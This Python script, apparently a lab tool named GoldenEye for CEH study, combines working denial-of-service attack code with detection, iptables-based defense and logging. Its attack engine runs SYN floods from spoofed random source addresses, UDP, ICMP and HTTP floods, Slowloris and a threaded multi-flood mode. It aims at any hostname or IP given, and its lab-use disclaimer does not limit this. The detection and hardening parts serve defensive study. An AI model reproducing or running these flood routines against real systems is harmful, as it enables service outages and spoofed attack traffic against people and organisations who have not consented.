#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║         GoldenEye – CEH Lab DoS/DDoS Security Tool          ║
║         Attack | Detection | Logging | Defense              ║
║         For Authorized Lab / CEH Study Use ONLY             ║
╚══════════════════════════════════════════════════════════════╝
"""

import argparse
import socket
import threading
import random
import time
import sys
import os
import json
import logging
import ipaddress
import subprocess
import signal
import urllib.parse
from datetime import datetime
from collections import defaultdict, deque

# Scapy import with error handling
try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, send, sniff,
        RandShort, get_if_list, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy not found. Install with: pip install scapy --break-system-packages")

# ─────────────────────────────────────────────────────────────
# COLORS & BANNER
# ─────────────────────────────────────────────────────────────

class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"

def banner():
    print(f"""
{C.CYAN}{C.BOLD}
 ██████╗  ██████╗ ██╗     ██████╗ ███████╗███╗   ██╗     ███████╗██╗   ██╗███████╗
██╔════╝ ██╔═══██╗██║     ██╔══██╗██╔════╝████╗  ██║     ██╔════╝╚██╗ ██╔╝██╔════╝
██║  ███╗██║   ██║██║     ██║  ██║█████╗  ██╔██╗ ██║     █████╗   ╚████╔╝ █████╗  
██║   ██║██║   ██║██║     ██║  ██║██╔══╝  ██║╚██╗██║     ██╔══╝    ╚██╔╝  ██╔══╝  
╚██████╔╝╚██████╔╝███████╗██████╔╝███████╗██║ ╚████║     ███████╗   ██║   ███████╗
 ╚═════╝  ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═══╝     ╚══════╝   ╚═╝   ╚══════╝
{C.RESET}
{C.YELLOW}  ┌─────────────────────────────────────────────────────────┐
{C.YELLOW}  │  GoldenEye – CEH Lab Tool v3.0 | Attack·Detect·Defend·Log│
{C.YELLOW}  │  Use ONLY on systems you own or have permission to test  │
{C.YELLOW}  └─────────────────────────────────────────────────────────┘{C.RESET}
""")

# ─────────────────────────────────────────────────────────────
# HOSTNAME RESOLVER
# ─────────────────────────────────────────────────────────────

def resolve_target(target):
    """Convert hostname/URL to IP address"""
    if target.startswith(('http://', 'https://')):
        parsed = urllib.parse.urlparse(target)
        target = parsed.netloc or parsed.path
    if ':' in target:
        target = target.split(':')[0]
    try:
        ipaddress.ip_address(target)
        return target
    except ValueError:
        try:
            ip = socket.gethostbyname(target)
            print(f"{C.CYAN}[*] Resolved {target} → {ip}{C.RESET}")
            return ip
        except socket.gaierror:
            print(f"{C.RED}[!] Could not resolve hostname: {target}{C.RESET}")
            sys.exit(1)

def generate_random_ip():
    """Generate a valid random IP address"""
    return f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"

# ─────────────────────────────────────────────────────────────
# LOGGING SYSTEM
# ─────────────────────────────────────────────────────────────

class Logger:
    def __init__(self, log_dir="./ceh_logs"):
        os.makedirs(log_dir, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.plain_path = f"{log_dir}/session_{ts}.log"
        self.json_path  = f"{log_dir}/session_{ts}.json"
        self.events     = []

        logging.basicConfig(
            filename=self.plain_path,
            level=logging.INFO,
            format="%(asctime)s [%(levelname)s] %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S"
        )
        self.logger = logging.getLogger("GoldenEye")
        self.info(f"Session started. Logs: {self.plain_path}")

    def _record(self, level, msg, extra=None):
        event = {
            "timestamp": datetime.now().isoformat(),
            "level": level,
            "message": msg,
        }
        if extra:
            event.update(extra)
        self.events.append(event)
        self._flush_json()

    def _flush_json(self):
        with open(self.json_path, "w") as f:
            json.dump(self.events, f, indent=2)

    def info(self, msg, extra=None):
        print(f"{C.GREEN}[INFO]{C.RESET} {msg}")
        self.logger.info(msg)
        self._record("INFO", msg, extra)

    def warn(self, msg, extra=None):
        print(f"{C.YELLOW}[WARN]{C.RESET} {msg}")
        self.logger.warning(msg)
        self._record("WARN", msg, extra)

    def alert(self, msg, extra=None):
        print(f"{C.RED}{C.BOLD}[ALERT]{C.RESET} {msg}")
        self.logger.critical(msg)
        self._record("ALERT", msg, extra)

    def attack(self, msg, extra=None):
        print(f"{C.MAGENTA}[ATTACK]{C.RESET} {msg}")
        self.logger.info(f"[ATTACK] {msg}")
        self._record("ATTACK", msg, extra)

    def defense(self, msg, extra=None):
        print(f"{C.CYAN}[DEFENSE]{C.RESET} {msg}")
        self.logger.info(f"[DEFENSE] {msg}")
        self._record("DEFENSE", msg, extra)

    def summary(self):
        alerts  = sum(1 for e in self.events if e["level"] == "ALERT")
        attacks = sum(1 for e in self.events if e["level"] == "ATTACK")
        defenses= sum(1 for e in self.events if e["level"] == "DEFENSE")
        print(f"""
{C.BOLD}{C.CYAN}━━━━━━━━━━━━━━━  SESSION SUMMARY  ━━━━━━━━━━━━━━━{C.RESET}
  Total Events : {len(self.events)}
  Attacks      : {C.MAGENTA}{attacks}{C.RESET}
  Alerts       : {C.RED}{alerts}{C.RESET}
  Defenses     : {C.CYAN}{defenses}{C.RESET}
  Plain Log    : {self.plain_path}
  JSON Log     : {self.json_path}
{C.BOLD}{C.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}
""")

# ─────────────────────────────────────────────────────────────
# DETECTION ENGINE
# ─────────────────────────────────────────────────────────────

class DetectionEngine:
    THRESHOLDS = {
        "syn_per_sec"   : 100,
        "udp_per_sec"   : 200,
        "icmp_per_sec"  : 50,
        "http_per_sec"  : 150,
        "conn_per_ip"   : 80,
        "half_open"     : 500,
    }

    def __init__(self, logger: Logger, interface="eth0", window=5):
        self.logger     = logger
        self.interface  = interface
        self.window     = window
        self.running    = False
        self.syn_times  = deque()
        self.udp_times  = deque()
        self.icmp_times = deque()
        self.http_times = deque()
        self.ip_syn_count  = defaultdict(int)
        self.half_open     = defaultdict(int)
        self.blocked_ips   = set()
        self.total_packets = 0
        self.alerts_fired  = 0

    def _trim_window(self, dq):
        now = time.time()
        while dq and dq[0] < now - self.window:
            dq.popleft()

    def _rate(self, dq):
        self._trim_window(dq)
        return len(dq) / self.window if dq else 0

    def _process_packet(self, pkt):
        self.total_packets += 1
        if not pkt.haslayer(IP):
            return
        src_ip = pkt[IP].src
        if src_ip in self.blocked_ips:
            return

        now = time.time()
        if pkt.haslayer(TCP):
            flags = pkt[TCP].flags
            if flags == 0x02:  # SYN
                self.syn_times.append(now)
                self.half_open[src_ip] += 1
                syn_rate = self._rate(self.syn_times)
                if syn_rate > self.THRESHOLDS["syn_per_sec"]:
                    self._fire_alert("SYN_FLOOD", src_ip, f"SYN rate: {syn_rate:.1f}/s")
                if self.ip_syn_count[src_ip] > self.THRESHOLDS["conn_per_ip"]:
                    self._fire_alert("SYN_PER_IP", src_ip, f"SYN count: {self.ip_syn_count[src_ip]}")
            elif flags & 0x12:  # SYN-ACK
                self.half_open[src_ip] = max(0, self.half_open[src_ip] - 1)
            if pkt.haslayer("Raw"):
                payload = bytes(pkt["Raw"])
                if b"GET" in payload or b"POST" in payload:
                    self.http_times.append(now)
                    http_rate = self._rate(self.http_times)
                    if http_rate > self.THRESHOLDS["http_per_sec"]:
                        self._fire_alert("HTTP_FLOOD", src_ip, f"HTTP rate: {http_rate:.1f}/s")
        elif pkt.haslayer(UDP):
            self.udp_times.append(now)
            udp_rate = self._rate(self.udp_times)
            if udp_rate > self.THRESHOLDS["udp_per_sec"]:
                self._fire_alert("UDP_FLOOD", src_ip, f"UDP rate: {udp_rate:.1f}/s")
        elif pkt.haslayer(ICMP):
            self.icmp_times.append(now)
            icmp_rate = self._rate(self.icmp_times)
            if icmp_rate > self.THRESHOLDS["icmp_per_sec"]:
                self._fire_alert("ICMP_FLOOD", src_ip, f"ICMP rate: {icmp_rate:.1f}/s")

    def _fire_alert(self, attack_type, src_ip, detail):
        self.alerts_fired += 1
        self.logger.alert(f"{attack_type} from {src_ip} | {detail}")

    def start(self, iface=None):
        iface = iface or self.interface
        self.running = True
        self.logger.info(f"Detection started on {iface}")
        print(f"{C.CYAN}[*] Sniffing on {iface} — Ctrl+C to stop{C.RESET}")
        try:
            sniff(iface=iface, prn=self._process_packet, store=False, stop_filter=lambda _: not self.running)
        except PermissionError:
            self.logger.warn("Root privileges required. Run with sudo.")
        except Exception as e:
            self.logger.warn(f"Sniff error: {e}")

    def stop(self):
        self.running = False
        self.logger.info(f"Detection stopped. Packets: {self.total_packets} | Alerts: {self.alerts_fired}")

    def live_stats(self):
        while self.running:
            syn_r  = self._rate(self.syn_times)
            udp_r  = self._rate(self.udp_times)
            icmp_r = self._rate(self.icmp_times)
            http_r = self._rate(self.http_times)
            print(f"\r{C.DIM}[STATS] SYN:{syn_r:6.1f}/s UDP:{udp_r:6.1f}/s ICMP:{icmp_r:6.1f}/s HTTP:{http_r:6.1f}/s Pkts:{self.total_packets} Alerts:{self.alerts_fired}{C.RESET}", end="")
            sys.stdout.flush()
            time.sleep(1)

# ─────────────────────────────────────────────────────────────
# DEFENSE ENGINE
# ─────────────────────────────────────────────────────────────

class DefenseEngine:
    def __init__(self, logger: Logger):
        self.logger = logger
        self.blocked = set()

    def _run(self, cmd, desc=""):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=False)
            if result.returncode == 0:
                self.logger.defense(f"✓ {desc or cmd}")
            else:
                self.logger.warn(f"Failed: {desc} | {result.stderr.strip()}")
        except Exception as e:
            self.logger.warn(f"Error: {e}")

    def block_ip(self, ip):
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            self.logger.warn(f"Invalid IP: {ip}")
            return
        self._run(f"iptables -A INPUT -s {ip} -j DROP", f"Blocked IP: {ip}")
        self.blocked.add(ip)

    def blackhole_ip(self, ip):
        self._run(f"ip route add blackhole {ip}/32", f"Blackholed {ip}")

    def block_port(self, port):
        self._run(f"iptables -A INPUT -p tcp --dport {port} -j DROP", f"Blocked port {port}")

    def rate_limit_syn(self):
        self._run("iptables -A INPUT -p tcp --syn -m limit --limit 100/s --limit-burst 200 -j ACCEPT", "Allow SYN up to 100/s")
        self._run("iptables -A INPUT -p tcp --syn -j DROP", "Drop excess SYN")

    def rate_limit_icmp(self):
        self._run("iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 10/s --limit-burst 20 -j ACCEPT", "Limit ICMP")
        self._run("iptables -A INPUT -p icmp --icmp-type echo-request -j DROP", "Drop excess ICMP")

    def enable_syn_cookies(self):
        self._run("sysctl -w net.ipv4.tcp_syncookies=1", "SYN cookies enabled")
        self._run("sysctl -w net.ipv4.tcp_max_syn_backlog=2048", "SYN backlog increased")

    def harden_full(self):
        self.logger.defense("Applying full hardening...")
        self.enable_syn_cookies()
        self.rate_limit_syn()
        self.rate_limit_icmp()
        self._run("iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 -j REJECT", "HTTP connlimit")
        self._run("iptables -A INPUT -m conntrack --ctstate NEW -m limit --limit 1000/s -j ACCEPT", "New conn limit")
        self._run("iptables -A INPUT -m conntrack --ctstate NEW -j DROP", "Drop excess new conn")
        self.logger.defense("Full hardening applied.")

    def flush_rules(self):
        self._run("iptables -F", "Flushed all rules")
        self._run("iptables -X", "Deleted custom chains")
        self.blocked.clear()

    def show_rules(self):
        subprocess.run("iptables -L -n -v", shell=True)

# ─────────────────────────────────────────────────────────────
# ATTACK ENGINE
# ─────────────────────────────────────────────────────────────

class AttackEngine:
    def __init__(self, logger: Logger):
        self.logger = logger
        self.stop_ev = threading.Event()

    def stop(self):
        self.stop_ev.set()

    def syn_flood(self, target_ip, target_port, count, verbose):
        self.logger.attack(f"SYN Flood → {target_ip}:{target_port} ({count} pkts)")
        sent = 0
        try:
            while sent < count and not self.stop_ev.is_set():
                src_ip = generate_random_ip()
                pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
                send(pkt, verbose=0)
                sent += 1
                if verbose and sent % 100 == 0:
                    print(f"  {C.MAGENTA}→{C.RESET} SYN sent: {sent}")
        except Exception as e:
            self.logger.warn(f"SYN error: {e}")
        self.logger.attack(f"SYN complete. Sent: {sent}")

    def udp_flood(self, target_ip, target_port, count, verbose):
        self.logger.attack(f"UDP Flood → {target_ip}:{target_port} ({count} pkts)")
        payload = os.urandom(1024)
        sent = 0
        try:
            while sent < count and not self.stop_ev.is_set():
                pkt = IP(dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / payload
                send(pkt, verbose=0)
                sent += 1
                if verbose and sent % 100 == 0:
                    print(f"  {C.MAGENTA}→{C.RESET} UDP sent: {sent}")
        except Exception as e:
            self.logger.warn(f"UDP error: {e}")
        self.logger.attack(f"UDP complete. Sent: {sent}")

    def icmp_flood(self, target_ip, count, verbose):
        self.logger.attack(f"ICMP Flood → {target_ip} ({count} pkts)")
        sent = 0
        try:
            while sent < count and not self.stop_ev.is_set():
                pkt = IP(dst=target_ip) / ICMP()
                send(pkt, verbose=0)
                sent += 1
                if verbose and sent % 100 == 0:
                    print(f"  {C.MAGENTA}→{C.RESET} ICMP sent: {sent}")
        except Exception as e:
            self.logger.warn(f"ICMP error: {e}")
        self.logger.attack(f"ICMP complete. Sent: {sent}")

    def http_flood(self, target_ip, target_port, count, verbose):
        self.logger.attack(f"HTTP Flood → {target_ip}:{target_port} ({count} reqs)")
        sent = 0
        while sent < count and not self.stop_ev.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target_ip, target_port))
                s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode())
                s.close()
                sent += 1
                if verbose and sent % 50 == 0:
                    print(f"  {C.MAGENTA}→{C.RESET} HTTP sent: {sent}")
            except Exception as e:
                if verbose:
                    print(f"  {C.YELLOW}!{C.RESET} Failed: {e}")
        self.logger.attack(f"HTTP complete. Sent: {sent}")

    def slowloris(self, target_ip, target_port, sockets_count, verbose):
        self.logger.attack(f"Slowloris → {target_ip}:{target_port} ({sockets_count} sockets)")
        sockets = []
        for _ in range(sockets_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_ip, target_port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
                sockets.append(s)
            except:
                pass
        self.logger.attack(f"Keeping {len(sockets)} connections open")
        while not self.stop_ev.is_set():
            for s in list(sockets):
                try:
                    s.send(f"X-Custom: {random.randint(1,5000)}\r\n".encode())
                except:
                    sockets.remove(s)
                    try:
                        new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new.settimeout(4)
                        new.connect((target_ip, target_port))
                        new.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
                        sockets.append(new)
                    except:
                        pass
            if verbose:
                print(f"  {C.MAGENTA}~{C.RESET} Active sockets: {len(sockets)}")
            time.sleep(10)

    def ddos_threaded(self, attack_func, threads, *args):
        self.logger.attack(f"DDoS: {threads} threads for {attack_func.__name__}")
        ts = []
        for i in range(threads):
            t = threading.Thread(target=attack_func, args=args, daemon=True)
            ts.append(t)
            t.start()
            print(f"  {C.MAGENTA}[+]{C.RESET} Thread {i+1}/{threads} started")
        for t in ts:
            t.join()
        self.logger.attack("DDoS complete")

# ─────────────────────────────────────────────────────────────
# REPORT GENERATOR
# ─────────────────────────────────────────────────────────────

def generate_report(log: Logger, session_info: dict):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_path = f"./ceh_logs/report_{ts}.txt"
    with open(report_path, "w") as f:
        f.write("="*65 + "\n")
        f.write("GoldenEye Session Report\n")
        f.write(f"Generated: {datetime.now()}\n")
        f.write("="*65 + "\n\n")
        f.write("SESSION INFO\n" + "-"*40 + "\n")
        for k, v in session_info.items():
            f.write(f"  {k:<20}: {v}\n")
        f.write("\nEVENT LOG\n" + "-"*40 + "\n")
        for e in log.events:
            f.write(f"  [{e['timestamp']}] [{e['level']:<8}] {e['message']}\n")
    print(f"\n{C.GREEN}[✓] Report saved: {report_path}{C.RESET}")

# ─────────────────────────────────────────────────────────────
# CLI PARSER
# ─────────────────────────────────────────────────────────────

def build_parser():
    parser = argparse.ArgumentParser(description="GoldenEye – CEH Lab DoS/DDoS Tool")
    sub = parser.add_subparsers(dest="mode", required=True)

    # Attack
    atk = sub.add_parser("attack")
    atk.add_argument("target", help="Target IP or hostname")
    atk.add_argument("-a", "--attack", required=True, choices=["syn","udp","icmp","http","slowloris"])
    atk.add_argument("-p", "--port", type=int, default=80)
    atk.add_argument("-c", "--count", type=int, default=1000)
    atk.add_argument("-t", "--threads", type=int, default=1)
    atk.add_argument("-s", "--sockets", type=int, default=200, help="Slowloris sockets")
    atk.add_argument("-v", "--verbose", action="store_true")

    # Detect
    det = sub.add_parser("detect")
    det.add_argument("-i", "--interface", default="eth0")
    det.add_argument("--threshold-syn", type=int, default=100)
    det.add_argument("--threshold-udp", type=int, default=200)
    det.add_argument("--threshold-icmp", type=int, default=50)
    det.add_argument("--threshold-http", type=int, default=150)

    # Defend
    dfn = sub.add_parser("defend")
    dfn.add_argument("--harden", action="store_true")
    dfn.add_argument("--block-ip", metavar="IP")
    dfn.add_argument("--blackhole-ip", metavar="IP")
    dfn.add_argument("--block-port", type=int)
    dfn.add_argument("--flush", action="store_true")
    dfn.add_argument("--show-rules", action="store_true")

    # Report
    rpt = sub.add_parser("report")
    return parser

# ─────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────

def main():
    banner()
    parser = build_parser()
    args = parser.parse_args()

    log = Logger()
    session = {"mode": args.mode, "started": datetime.now().isoformat()}

    if args.mode == "attack":
        if not SCAPY_AVAILABLE:
            print(f"{C.RED}[!] Scapy required for attacks.{C.RESET}")
            sys.exit(1)
        target_ip = resolve_target(args.target)
        session.update({"target": args.target, "resolved": target_ip, "attack": args.attack, "port": args.port})
        ae = AttackEngine(log)
        print(f"\n{C.BOLD}Target IP: {target_ip}{C.RESET}\n")
        def signal_handler(sig, frame):
            print(f"\n{C.YELLOW}[*] Stopping...{C.RESET}")
            ae.stop()
            sys.exit(0)
        signal.signal(signal.SIGINT, signal_handler)
        if args.attack == "syn":
            if args.threads > 1:
                ae.ddos_threaded(ae.syn_flood, args.threads, target_ip, args.port, args.count, args.verbose)
            else:
                ae.syn_flood(target_ip, args.port, args.count, args.verbose)
        elif args.attack == "udp":
            if args.threads > 1:
                ae.ddos_threaded(ae.udp_flood, args.threads, target_ip, args.port, args.count, args.verbose)
            else:
                ae.udp_flood(target_ip, args.port, args.count, args.verbose)
        elif args.attack == "icmp":
            if args.threads > 1:
                ae.ddos_threaded(ae.icmp_flood, args.threads, target_ip, args.count, args.verbose)
            else:
                ae.icmp_flood(target_ip, args.count, args.verbose)
        elif args.attack == "http":
            if args.threads > 1:
                ae.ddos_threaded(ae.http_flood, args.threads, target_ip, args.port, args.count, args.verbose)
            else:
                ae.http_flood(target_ip, args.port, args.count, args.verbose)
        elif args.attack == "slowloris":
            ae.slowloris(target_ip, args.port, args.sockets, args.verbose)

    elif args.mode == "detect":
        if not SCAPY_AVAILABLE:
            print(f"{C.RED}[!] Scapy required for detection.{C.RESET}")
            sys.exit(1)
        de = DetectionEngine(log, interface=args.interface)
        de.THRESHOLDS["syn_per_sec"] = args.threshold_syn
        de.THRESHOLDS["udp_per_sec"] = args.threshold_udp
        de.THRESHOLDS["icmp_per_sec"] = args.threshold_icmp
        de.THRESHOLDS["http_per_sec"] = args.threshold_http
        threading.Thread(target=de.live_stats, daemon=True).start()
        signal.signal(signal.SIGINT, lambda s,f: de.stop())
        de.start()

    elif args.mode == "defend":
        dfe = DefenseEngine(log)
        if args.harden:
            dfe.harden_full()
        if args.block_ip:
            dfe.block_ip(args.block_ip)
        if args.blackhole_ip:
            dfe.blackhole_ip(args.blackhole_ip)
        if args.block_port:
            dfe.block_port(args.block_port)
        if args.flush:
            dfe.flush_rules()
        if args.show_rules:
            dfe.show_rules()

    elif args.mode == "report":
        generate_report(log, session)

    log.summary()
    generate_report(log, session)

if __name__ == "__main__":
    main()
